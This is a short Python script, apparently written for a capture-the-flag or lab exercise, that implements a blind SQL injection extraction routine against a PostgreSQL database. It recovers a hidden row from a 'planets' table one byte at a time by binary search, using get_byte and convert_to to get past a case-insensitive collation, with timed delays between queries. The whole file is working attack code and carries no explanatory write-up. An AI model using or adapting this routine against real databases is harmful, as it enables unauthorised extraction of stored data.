"""Byte-exact extraction primitives for a case-insensitive collation.

`=` and LIKE cannot distinguish 'a' from 'A' here, so case has to come from the byte
value: get_byte(convert_to(substr(x,i,1),'UTF8'),1) is exact.
"""
import sys
import time
from cmdexec import bit, probe

sys.setrecursionlimit(10000)


def byte_at(expr, i):
    e = "(SELECT get_byte(convert_to(substr((%s),%d,1),'UTF8'),1))" % (expr, i)
    if not bit("(%s)>0" % e):
        return None
    lo, hi = 1, 127
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(2.0)
        if bit("(%s)>=%d" % (e, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


if __name__ == "__main__":
    print("[*] get_byte/convert_to usable: %s" % bit("(SELECT get_byte(convert_to('A','UTF8'),1))=65"), flush=True)
    print("[*] ascii() usable            : %s" % bit("(SELECT ascii('A'))=65"), flush=True)
    print("[*] ctid-last row is a known  : %s" % bit("(SELECT planets::text FROM planets ORDER BY ctid DESC LIMIT 1) LIKE '%MARS%'"), flush=True)
    HID = "(SELECT planets::text FROM planets ORDER BY ctid DESC LIMIT 1)"
    print("[*] len of hidden row text    : %s" % bit("length(%s)>0" % HID), flush=True)
